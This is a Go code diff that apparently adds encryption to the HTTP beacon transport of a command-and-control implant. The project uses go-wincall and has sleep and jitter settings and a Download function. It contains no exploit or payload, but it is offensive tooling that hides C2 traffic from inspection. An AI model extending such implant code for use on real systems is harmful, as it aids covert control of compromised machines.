@@ -9,6 +9,7 @@ import (
 	"unsafe"
 
 	wc "github.com/carved4/go-wincall"
+	"github.com/carved4/carved/shared/crypto"
 	"github.com/carved4/carved/shared/proto"
 )
 
@@ -73,13 +74,28 @@ func (t *HTTPTransport) UpdateSleep(sleep uint32, jitter uint8) {
 }
 
 func (t *HTTPTransport) post(endpoint string, body []byte) ([]byte, error) {
-
 	baseURL := t.config.ServerURL
 	if len(baseURL) > 0 && baseURL[len(baseURL)-1] == '/' {
 		baseURL = baseURL[:len(baseURL)-1]
 	}
 	url := baseURL + endpoint
-	return httpRequest(url, "POST", body, t.config.UserAgent)
+
+	encrypted, err := crypto.Encrypt(body)
+	if err != nil {
+		return nil, fmt.Errorf("encrypt failed: %w", err)
+	}
+
+	respData, err := httpRequest(url, "POST", encrypted, t.config.UserAgent)
+	if err != nil {
+		return nil, err
+	}
+
+	decrypted, err := crypto.Decrypt(respData)
+	if err != nil {
+		return nil, fmt.Errorf("decrypt failed: %w", err)
+	}
+
+	return decrypted, nil
 }
 
 func httpRequest(url, method string, body []byte, userAgent string) ([]byte, error) {
@@ -229,7 +245,11 @@ func parseHostPathPort(remaining string, host, path *string, port *uint16) {
 }
 
 func Get(url string) ([]byte, error) {
-	return httpRequest(url, "GET", nil, "")
+	respData, err := httpRequest(url, "GET", nil, "")
+	if err != nil {
+		return nil, err
+	}
+	return crypto.Decrypt(respData)
 }
 
 func Download(url string) ([]byte, error) {
